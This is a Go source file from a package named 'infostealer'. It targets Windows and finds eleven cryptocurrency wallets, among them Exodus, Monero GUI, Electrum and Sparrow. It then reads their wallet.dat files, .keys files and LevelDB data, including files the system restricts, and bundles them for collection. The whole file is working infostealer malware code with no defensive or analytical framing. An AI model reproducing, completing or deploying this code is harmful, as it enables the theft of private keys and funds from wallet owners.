//go:build windows

package infostealer

import (
	"io"
	"os"
	"path/filepath"
	"strings"
)

var appdata string = os.Getenv("APPDATA")
var localappdata string = os.Getenv("LOCALAPPDATA")
var userprofile string = os.Getenv("USERPROFILE")

var supportedWallets = []struct {
	Name string
	Path string
	Type string
}{
	{"Guarda", filepath.Join(appdata, "Guarda", "leveldb"), "chromium"},
	{"Coinomi", filepath.Join(localappdata, "Coinomi", "leveldb"), "chromium"},
	{"Jaxx Liberty", filepath.Join(appdata, "com.liberty.jaxx", "leveldb"), "chromium"},
	{"Exodus", filepath.Join(appdata, "Exodus", "indexeddb", "file__0.indexeddb.leveldb"), "chromium"},
	{"Dogecoin Core", filepath.Join(appdata, "Dogecoin"), "core"},
	{"Litecoin Core", filepath.Join(appdata, "Litecoin"), "core"},
	{"Dash Core", filepath.Join(appdata, "DashCore"), "core"},
	{"Monero GUI", filepath.Join(userprofile, "Documents", "Monero", "wallets"), "flat"},
	{"Electron Cash", filepath.Join(appdata, "ElectronCash", "wallets"), "flat"},
	{"Electrum-LTC", filepath.Join(appdata, "Electrum-LTC", "wallets"), "flat"},
	{"Sparrow Wallet", filepath.Join(appdata, "Sparrow", "wallets"), "flat"},
}

type walletInfo struct {
	Name string
	Path string
}

type chromiumWallet struct {
	Info       walletInfo
	LeveldbZip []byte
}

func (wallet *chromiumWallet) getData() {
	localdb := copyLevelDB(filepath.Join(wallet.Info.Path))
	defer os.RemoveAll(localdb)

	wallet.LeveldbZip = zipFolder(localdb)
}

type coreWallets struct {
	Info    walletInfo
	Wallets []struct {
		Name       string
		WalletData []byte
	}
}

func (wallet *coreWallets) getData() {
	_, e := os.Stat(filepath.Join(wallet.Info.Path, "wallet.dat"))
	if e != nil {
		folder, _ := os.ReadDir(filepath.Join(wallet.Info.Path, "wallets"))
		for _, subdir := range folder {
			if subdir.IsDir() {
				handle := readRestrictedFile(filepath.Join(wallet.Info.Path, "wallets", subdir.Name(), "wallet.dat"))
				sourcefile := os.NewFile(handle, "randombullshit")
				data, _ := io.ReadAll(sourcefile)
				sourcefile.Close()
				wallet.Wallets = append(wallet.Wallets, struct {
					Name       string
					WalletData []byte
				}{
					Name:       subdir.Name(),
					WalletData: data,
				})
			}
		}
	} else {
		handle := readRestrictedFile(filepath.Join(wallet.Info.Path, "wallet.dat"))
		sourcefile := os.NewFile(handle, "randombullshit")
		data, _ := io.ReadAll(sourcefile)
		sourcefile.Close()
		wallet.Wallets = append(wallet.Wallets, struct {
			Name       string
			WalletData []byte
		}{
			Name:       "Default",
			WalletData: data,
		})
	}
}

type flatWallet struct {
	Info      walletInfo
	FlatFiles []struct {
		Name     string
		FileData []byte
	}
}

func (wallet *flatWallet) getMonero() {
	folder, _ := os.ReadDir(wallet.Info.Path)
	for _, file := range folder {
		if !file.IsDir() && strings.Contains(file.Name(), ".keys") {
			handle := readRestrictedFile(filepath.Join(wallet.Info.Path, file.Name()))
			sourcefile := os.NewFile(handle, "randombullshit")
			data, _ := io.ReadAll(sourcefile)
			sourcefile.Close()

			wallet.FlatFiles = append(wallet.FlatFiles, struct {
				Name     string
				FileData []byte
			}{
				Name:     file.Name(),
				FileData: data,
			})
		}
	}
}

func (wallet *flatWallet) getSparrow() {
	folder, _ := os.ReadDir(wallet.Info.Path)
	for _, file := range folder {
		if !file.IsDir() {
			handle := readRestrictedFile(filepath.Join(wallet.Info.Path, file.Name()))
			sourcefile := os.NewFile(handle, "randombullshit")
			data, _ := io.ReadAll(sourcefile)
			sourcefile.Close()

			wallet.FlatFiles = append(wallet.FlatFiles, struct {
				Name     string
				FileData []byte
			}{
				Name:     file.Name(),
				FileData: data,
			})
		}
	}
}

func (wallet *flatWallet) getElectron() {
	files, _ := os.ReadDir(wallet.Info.Path)
	testnet := false
	for _, file := range files {
		if file.IsDir() {
			if file.Name() == "testnet" {
				testnet = true
			}
		}

		if !strings.Contains(file.Name(), ".tmp") && !strings.Contains(file.Name(), ".new") {
			handle := readRestrictedFile(filepath.Join(wallet.Info.Path, file.Name()))
			sourcefile := os.NewFile(handle, "randombullshit")
			data, _ := io.ReadAll(sourcefile)
			sourcefile.Close()

			wallet.FlatFiles = append(wallet.FlatFiles, struct {
				Name     string
				FileData []byte
			}{
				Name:     file.Name(),
				FileData: data,
			})
		}
	}
	if testnet {
		files, _ := os.ReadDir(filepath.Join(wallet.Info.Path, "testnet", "wallets"))
		for _, file := range files {
			if file.IsDir() {
				continue
			}

			if !strings.Contains(file.Name(), ".tmp") && !strings.Contains(file.Name(), ".new") {
				handle := readRestrictedFile(filepath.Join(wallet.Info.Path, "testnet", "wallets", file.Name()))
				sourcefile := os.NewFile(handle, "randombullshit")
				data, _ := io.ReadAll(sourcefile)
				sourcefile.Close()

				wallet.FlatFiles = append(wallet.FlatFiles, struct {
					Name     string
					FileData []byte
				}{
					Name:     file.Name(),
					FileData: data,
				})
			}
		}
	}
}

type flatWallets []flatWallet

func (wallets *flatWallets) getData() {
	for i, wallet := range *wallets {
		switch wallet.Info.Name {
		case "Electron Cash", "Electrum-LTC":
			(*wallets)[i].getElectron()
		case "Sparrow Wallet":
			(*wallets)[i].getSparrow()
		case "Monero GUI":
			(*wallets)[i].getMonero()
		}
	}
}

type WalletList struct {
	FlatWallets     flatWallets
	CoreWallets     []coreWallets
	ChromiumWallets []chromiumWallet
}

func (wallets *WalletList) populate() {
	wallets.FlatWallets.getData()
	for i, _ := range wallets.CoreWallets {
		wallets.CoreWallets[i].getData()
	}
	for i, _ := range wallets.ChromiumWallets {
		wallets.ChromiumWallets[i].getData()
	}
}

func detectWallets() WalletList {
	var wallets WalletList
	for _, supported := range supportedWallets {
		_, e := os.Stat(supported.Path)
		if e == nil {
			switch supported.Type {
			case "core":
				wallets.CoreWallets = append(wallets.CoreWallets, coreWallets{
					Info: walletInfo{
						Name: supported.Name,
						Path: supported.Path,
					},
				})
			case "flat":
				wallets.FlatWallets = append(wallets.FlatWallets, flatWallet{
					Info: walletInfo{
						Name: supported.Name,
						Path: supported.Path,
					},
				})
			case "chromium":
				wallets.ChromiumWallets = append(wallets.ChromiumWallets, chromiumWallet{
					Info: walletInfo{
						Name: supported.Name,
						Path: supported.Path,
					},
				})
			}
		}
	}
	return wallets
}

func Crypto() WalletList {
	wallets := detectWallets()
	wallets.populate()
	return wallets
}
